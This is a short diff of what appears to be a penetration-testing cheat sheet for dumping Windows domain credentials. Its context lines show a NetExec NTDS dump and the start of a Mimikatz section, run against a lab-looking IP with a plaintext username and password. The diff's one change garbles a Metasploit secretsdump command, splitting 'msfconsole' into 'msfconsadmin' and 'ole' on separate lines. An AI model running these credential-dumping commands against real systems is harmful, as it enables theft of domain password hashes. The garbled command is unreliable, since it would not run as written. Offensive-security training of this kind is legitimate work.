@@ -188,7 +188,8 @@ nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator
 
 
 #metasploit 
-msfconsole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48; set SMBUser aarti; set SMBPass Password@1; run"
+msfconsadmin
+ole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48; set SMBUser aarti; set SMBPass Password@1; run"
 
 #using Mimikatz
 privilege::debug
